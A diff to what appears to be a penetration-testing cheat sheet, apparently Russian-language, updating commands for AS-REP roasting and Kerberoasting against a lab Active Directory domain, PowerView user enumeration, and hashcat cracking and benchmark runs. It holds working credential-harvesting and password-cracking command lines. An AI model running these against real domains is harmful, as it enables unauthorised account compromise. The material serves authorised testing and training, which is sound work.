@@ -48,7 +48,7 @@ PowerView3 > Get-DomainUser -UACFilter DONT_REQ_PREAUTH
 ```
 $ GetNPUsers.py megacorp.local/ -dc-ip 127.0.0.1 -no-pass -usersfile /usr/share/seclists/Usernames/Names/names.txt -request -format hashcat -outputfile asprep.in | tee GetNPUsers.out
 $ cat GetNPUsers.out | grep -v 'Client not found in Kerberos database'
-$ ./hashcat64.exe -m 18200 -a 0 -w 4 -O --session=snovvcrash -o asprep.out asprep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
+$ hashcat -m 18200 -a 0 -w 4 -O --session=asprep -o asprep.out asprep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
 ##### ASREPRoast.ps1
@@ -98,8 +98,8 @@ PowerView3 > Get-DomainUser -Identity snovvcrash -Properties samaccountname,serv
 ##### GetUserSPNs.py
 
 ```
-$ GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 -request -outfile tgsrep.in
-$ ./hashcat64.exe -m 13100 -a 0 -w 4 -O --session=snovvcrash -o tgsrep.out tgsrep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
+$ GetUserSPNs.py megacorp.local/snovvcrash:'Passw0rd!' -dc-ip 127.0.0.1 [-request|-save] -outputfile tgsrep.in
+$ hashcat -m 13100 -a 0 -w 4 -O --session=tgsrep -o tgsrep.out tgsrep.in seclists/Passwords/darkc0de.txt -r rules/d3ad0ne.rule
 ```
 
 ##### PowerView
@@ -4850,9 +4850,9 @@ Benchmarks:
 $ nvidia-smi.exe
 
  # MD5
-$ ./hashcat64.exe -m 0 -b
+$ hashcat -m 0 -b
  # NTLM
-$ ./hashcat64.exe -m 1000 -b
+$ hashcat -m 1000 -b
 ```
 
 | Единица хэшрейта  |           Хэшрейт             | Хэши в секунду  |
